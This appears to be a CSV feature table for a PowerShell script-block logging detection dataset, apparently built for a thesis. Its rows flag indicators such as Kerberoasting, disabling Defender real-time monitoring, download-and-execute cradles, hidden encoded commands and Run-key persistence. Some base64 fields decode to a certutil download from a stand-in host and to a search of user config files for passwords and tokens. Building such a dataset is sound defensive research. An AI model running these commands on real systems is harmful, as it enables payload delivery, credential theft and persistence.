PST-069,windows_event_4104_scriptblocktext,89,1,10,8,0.089888,0.011236,0.101124,4.678805,0,0,0,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-070,windows_event_4104_scriptblocktext,114,1,8,12,0.105263,0.0,0.061404,5.053145,1,0,50,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,1,0,1,1,0,0
PST-071,windows_event_4104_scriptblocktext,93,1,7,21,0.225806,0.107527,0.032258,5.29455,1,0,20,0,0,0,0,0,0,0,0,2,FromBase64String;aW52ZW50b3J5LW5vdGU,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-072,windows_event_4104_scriptblocktext,158,1,17,39,0.246835,0.0,0.158228,4.456602,10,10,75,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,invoke-kerberoast;outputformat hashcat;samaccountname,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-073,windows_event_4104_scriptblocktext,56,1,5,5,0.089286,0.0,0.089286,4.113695,1,0,26,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-074,windows_event_4104_scriptblocktext,131,1,13,30,0.229008,0.0,0.022901,4.730117,1,0,91,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,mshta,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-075,windows_event_4104_scriptblocktext,126,1,9,22,0.174603,0.0,0.047619,4.994711,1,0,86,1,25,0,0,0,0,0,0,4,ExcLusiOnPatH;ThesiS_iNERT__;diSAbLErEALTImeMOnITOrinG;sEt-MpprEFerenCe,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,disableRealtimeMonitoring;exclusionpath;set-mppreference,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-076,windows_event_4104_scriptblocktext,153,1,11,27,0.176471,0.0,0.052288,4.977561,1,0,111,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,2,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,0,3,3,0,0
PST-077,windows_event_4104_scriptblocktext,57,1,6,5,0.087719,0.017544,0.105263,4.39797,0,0,0,0,0,0,0,0,0,0,0,2,Get-HotFix;HotFixID,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-078,windows_event_4104_scriptblocktext,244,1,30,92,0.377049,0.004098,0.045082,5.188666,14,13,137,0,0,0,2,0,1,0,0,3,AmPLe.I;NeW-ObjECT;VErxmLhTTP,1,iex,1,0,0,2,responseText;serverxmlhttp,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,0
PST-079,windows_event_4104_scriptblocktext,82,1,10,9,0.109756,0.02439,0.121951,4.411246,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-080,windows_event_4104_scriptblocktext,182,1,19,21,0.115385,0.021978,0.038462,5.075978,1,0,144,1,29,1,10,0,0,0,0,1,AdABlAC0ATwB1AH,2,encodedcommand;windowstyle hidden,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-081,windows_event_4104_scriptblocktext,153,1,11,27,0.176471,0.0,0.052288,5.146674,1,0,111,0,0,0,0,0,0,0,0,5,ColLecT.ziP;ComPResS-arChIvE;DeSTInaTionpAtH;UseRpROfILe;gET-chiLditEm,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,2,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,0,3,3,0,0
PST-082,windows_event_4104_scriptblocktext,65,1,6,6,0.092308,0.0,0.092308,4.404544,0,0,0,0,0,0,0,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,2,1,2,2,0,0
PST-083,windows_event_4104_scriptblocktext,295,1,31,76,0.257627,0.013559,0.047458,5.35555,14,10,190,0,0,1,7,0,1,0,0,5,ABLAC0AtWb1AHQ;AcAB1aHqAiaAnAFqasab;SqBoAEuAuGBuaCCA;fAfMasqbtAc0A;hoST.exAmplE.INV,2,encodedcommand;scriptblock,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,1,1,0,0,,0,0,0,2,2,1,4,3,0
PST-084,windows_event_4104_scriptblocktext,70,1,7,17,0.242857,0.0,0.142857,4.600801,2,2,14,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-085,windows_event_4104_scriptblocktext,143,1,10,14,0.097902,0.006993,0.062937,4.882098,1,0,51,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,currentversion\run,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,2,1,2,2,0,0
PST-086,windows_event_4104_scriptblocktext,54,1,6,6,0.111111,0.018519,0.092593,4.342282,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-087,windows_event_4104_scriptblocktext,172,1,9,11,0.063953,0.023256,0.040698,5.312058,1,0,134,1,72,1,0,0,0,0,0,5,HidDeN;NoProfIlE;eNCOdEDComMAnD;vWBYaGKAdABLAc0aTWb1aHqACaB1AhqaiAAnafQasAbfAFMAsqbtAC0asQBoaEuAUGbUacca;wiNDOwStylE,2,encodedcommand;windowstyle hidden,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-088,windows_event_4104_scriptblocktext,237,1,29,88,0.371308,0.008439,0.037975,4.831956,12,12,122,0,0,0,0,0,1,0,0,0,,0,,0,0,0,1,invoke-restmethod,0,1,0,1,checkin,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,2,1,0
PST-089,windows_event_4104_scriptblocktext,86,1,6,7,0.081395,0.0,0.069767,4.653675,0,0,0,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-090,windows_event_4104_scriptblocktext,85,2,11,10,0.117647,0.023529,0.141176,4.69259,1,0,21,0,0,0,1,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-091,windows_event_4104_scriptblocktext,45,1,4,4,0.088889,0.0,0.088889,4.266047,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-092,windows_event_4104_scriptblocktext,123,1,16,20,0.162602,0.04065,0.073171,4.724287,2,0,78,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-093,windows_event_4104_scriptblocktext,97,1,11,10,0.103093,0.020619,0.113402,4.533608,1,1,16,0,0,0,0,0,0,0,0,1,Get-NetAdapter,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-094,windows_event_4104_scriptblocktext,450,1,10,27,0.06,0.037778,0.006667,4.924409,1,0,328,1,328,1,0,0,0,0,0,2,FromBase64String;SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBNAGUAdABoAG8AZAAgAFAAbwBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGMAaABlAGMAawBpAG4AJwAgAC0AQgBvAGQAeQAgAEAAewBoAG8AcwB0AD0AJwBXAFMALQAwADEAJwA7AHUAcwBlAHIAPQAnAGEAbgBhAGwAeQBzAHQAJwA7AHMAdABhAHQAdQBzAD0AJwBvAGsAJwB9AA,0,,0,0,0,1,invoke-restmethod,0,1,1,1,checkin,0,1,1,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,3,2,2
PST-095,windows_event_4104_scriptblocktext,157,1,17,34,0.216561,0.019108,0.089172,4.817907,2,0,75,0,0,0,0,0,0,0,0,1,ConvertFrom-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-096,windows_event_4104_scriptblocktext,171,1,16,37,0.216374,0.011696,0.076023,5.194864,3,3,14,0,0,0,0,0,0,0,0,2,ForEach-Object;Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-097,windows_event_4104_scriptblocktext,89,1,9,9,0.101124,0.011236,0.101124,4.264418,2,1,42,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-098,windows_event_4104_scriptblocktext,139,1,16,34,0.244604,0.007194,0.151079,4.656351,7,6,45,0,0,0,0,6,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-099,windows_event_4104_scriptblocktext,121,1,14,14,0.115702,0.024793,0.132231,4.429826,2,0,67,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-100,windows_event_4104_scriptblocktext,152,1,19,48,0.315789,0.013158,0.164474,4.42482,10,10,69,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-101,windows_event_4104_scriptblocktext,602,1,10,25,0.041528,0.039867,0.004983,4.844091,1,0,480,1,480,1,0,0,0,0,0,2,FromBase64String;YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcABzADoALwAvAGMAZQByAHQALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGIAbABvAGIALgB0AHgAdAAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAOwAgAGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABiAGwAbwBiAC4AdAB4AHQAIABDADoAXABfAF8AVABIAEUAUwBJAFMAXwBJAE4ARQBSAFQAXwBfAFwAcwB0AGEAZwBlAC4AYgBpAG4A,0,,0,0,0,1,certutil,0,1,1,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,1,certutil,0,1,1,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,3,2,2
PST-102,windows_event_4104_scriptblocktext,113,1,12,12,0.106195,0.017699,0.115044,4.734314,1,1,16,0,0,0,0,0,0,0,0,1,ConvertTo-Csv,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-103,windows_event_4104_scriptblocktext,610,1,10,25,0.040984,0.027869,0.004918,4.703686,1,0,488,1,488,1,0,0,0,0,0,1,FromBase64String,2,encodedcommand;scriptblock,0,2,2,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,0,2,2,0,,0,0,0,3,3,1,5,4,4
PST-104,windows_event_4104_scriptblocktext,91,1,7,18,0.197802,0.021978,0.032967,4.990068,1,0,53,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,rundll32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-105,windows_event_4104_scriptblocktext,129,1,18,29,0.224806,0.062016,0.085271,5.08623,2,0,67,0,0,0,0,0,0,0,0,1,ForEach-Object,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-106,windows_event_4104_scriptblocktext,82,1,13,20,0.243902,0.04878,0.04878,4.652083,1,0,58,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-107,windows_event_4104_scriptblocktext,44,1,4,4,0.090909,0.0,0.090909,4.450196,0,0,0,0,0,0,0,0,0,0,0,1,Get-TimeZone,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-108,windows_event_4104_scriptblocktext,102,1,9,9,0.088235,0.029412,0.088235,4.642152,1,1,16,0,0,0,0,0,0,0,0,1,Get-CimInstance,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,win32_bios,1,0,0,1,0,1,1,0,0
PST-109,windows_event_4104_scriptblocktext,119,1,10,11,0.092437,0.008403,0.084034,4.762618,1,1,16,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-110,windows_event_4104_scriptblocktext,146,1,11,29,0.19863,0.0,0.041096,5.121624,1,0,104,0,0,0,0,0,0,0,0,4,BiTS.ExaMpLE.InvaLiD;DeSTiNAtiON;STaRT-bITStrANSFER;pAylOAD.BiN,0,,0,0,0,1,start-bitstransfer,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-111,windows_event_4104_scriptblocktext,107,1,12,21,0.196262,0.018692,0.065421,5.101673,1,0,69,0,0,0,0,0,0,0,0,1,ReG.ExAmpLe.inVAliD,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-112,windows_event_4104_scriptblocktext,220,1,16,41,0.186364,0.004545,0.054545,5.28904,1,0,176,0,0,0,0,0,0,0,0,7,MIcrOsofT;ThEsIS_IneRT__;curRENTVersIoN;nEW-iTeMpROPerTy;powErsHelL.eXe;upDAteChecK;wINdOWsTYLe,1,windowstyle hidden,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,currentversion\run;new-itemproperty,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-113,windows_event_4104_scriptblocktext,114,1,12,25,0.219298,0.035088,0.017544,5.02488,1,0,76,0,0,0,0,0,0,0,0,1,CopyFromScreen,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-114,windows_event_4104_scriptblocktext,139,1,18,51,0.366906,0.0,0.064748,4.86447,10,9,48,0,0,0,3,0,1,0,0,1,rTTo-Js,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,0,1,0,0,,0,0,0,0,,0,0,0,1,0,0,1,1,0
PST-115,windows_event_4104_scriptblocktext,167,1,17,17,0.101796,0.011976,0.107784,4.759533,2,1,29,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-116,windows_event_4104_scriptblocktext,131,1,12,11,0.083969,0.007634,0.099237,4.644485,1,1,4,0,0,0,0,0,0,0,0,1,Get-NetFirewallRule,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-117,windows_event_4104_scriptblocktext,118,1,14,14,0.118644,0.016949,0.127119,4.472154,2,2,23,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-118,windows_event_4104_scriptblocktext,11,1,2,1,0.090909,0.0,0.090909,3.459432,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-119,windows_event_4104_scriptblocktext,145,1,17,34,0.234483,0.02069,0.062069,4.814075,2,0,87,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-120,windows_event_4104_scriptblocktext,346,1,10,25,0.072254,0.023121,0.008671,5.043671,1,0,224,1,224,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAVQBuAGkAbgBzAHQAYQBsAGwAXAAqACcA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,1,2,1,1,2,1,1
PST-121,windows_event_4104_scriptblocktext,169,1,15,48,0.284024,0.0,0.130178,4.560807,10,10,84,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,0,1,0,0,1,1,0
PST-122,windows_event_4104_scriptblocktext,191,1,22,48,0.251309,0.068063,0.026178,5.032776,1,0,147,0,0,0,0,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,1,jitter,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-123,windows_event_4104_scriptblocktext,172,1,13,13,0.075581,0.0,0.081395,4.644128,1,0,43,0,0,0,0,0,0,0,0,1,Get-MpComputerStatus,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-124,windows_event_4104_scriptblocktext,208,1,23,75,0.360577,0.0,0.033654,4.86845,12,12,97,0,0,0,0,0,1,0,0,0,,0,,0,0,0,1,invoke-webrequest,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-125,windows_event_4104_scriptblocktext,90,1,10,9,0.1,0.022222,0.111111,4.627205,1,1,16,0,0,0,0,0,0,0,0,2,Get-HotFix;HotFixID,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-126,windows_event_4104_scriptblocktext,69,1,8,14,0.202899,0.014493,0.086957,4.371825,4,4,30,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-127,windows_event_4104_scriptblocktext,83,1,7,12,0.144578,0.0,0.072289,4.586347,1,0,45,0,0,0,0,0,0,0,0,1,ConvertTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-128,windows_event_4104_scriptblocktext,217,1,18,38,0.175115,0.018433,0.115207,4.910011,10,10,134,0,0,1,0,9,0,0,0,3,UAUgBUACcA;VwByAGkAdAB;lAC0ATwB1AHQAcA,2,encodedcommand;windowstyle hidden,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,2,2,0
PST-129,windows_event_4104_scriptblocktext,103,1,8,20,0.194175,0.0,0.106796,4.83702,2,2,9,0,0,0,0,2,0,0,0,2,AuDiTMoDe;SeRvErNaMe,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-130,windows_event_4104_scriptblocktext,125,1,10,35,0.28,0.0,0.056,4.871283,1,0,81,0,0,0,0,0,0,0,0,0,,1,get-command,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-131,windows_event_4104_scriptblocktext,273,1,20,51,0.186813,0.014652,0.113553,5.0042,11,4,183,0,0,1,0,10,0,0,0,1,ByAGkAdABlAC0AT,2,encodedcommand;scriptblock,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,1,1,0,0,,0,0,0,2,2,1,4,3,0
PST-132,windows_event_4104_scriptblocktext,133,1,16,29,0.218045,0.0,0.045113,4.954992,1,0,93,0,0,0,7,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,disableRealtimeMonitoring;exclusionpath;set-mppreference,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-133,windows_event_4104_scriptblocktext,75,1,6,6,0.08,0.026667,0.08,4.60745,0,0,0,0,0,0,0,0,0,0,0,2,Get-CimInstance;Win32_LogicalDisk,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-134,windows_event_4104_scriptblocktext,137,1,15,30,0.218978,0.007299,0.029197,4.98675,1,0,97,0,0,0,5,0,0,0,0,0,,1,iex,1,0,0,2,downloadstring;webclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-135,windows_event_4104_scriptblocktext,91,1,11,18,0.197802,0.010989,0.043956,4.574627,1,0,63,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-136,windows_event_4104_scriptblocktext,434,1,10,27,0.062212,0.025346,0.006912,4.859714,1,0,312,1,312,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEkAbgBjAGwAdQBkAGUAIAAnACoALgBjAG8AbgBmAGkAZwAnACwAJwAqAC4AeABtAGwAJwAgAHwAIABTAGUAbABlAGMAdAAtAFMAdAByAGkAbgBnACAALQBQAGEAdAB0AGUAcgBuACAAJwBwAGEAcwBzAHcAbwByAGQAfAB0AG8AawBlAG4AfABzAGUAYwByAGUAdAAnAA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,2,password;select-string,0,2,2,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,1,3,2,1,4,3,3
PST-137,windows_event_4104_scriptblocktext,132,1,10,25,0.189394,0.007576,0.030303,5.259425,1,0,92,0,0,0,0,0,0,0,0,3,DOwNLoaDstriNg;net.weBcLienT;sTagE.exAMpLE.iNVAlID,1,iex,1,0,0,2,downloadstring;webclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-138,windows_event_4104_scriptblocktext,218,1,18,48,0.220183,0.0,0.050459,4.971298,1,0,180,0,0,0,0,0,0,1,0,0,,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
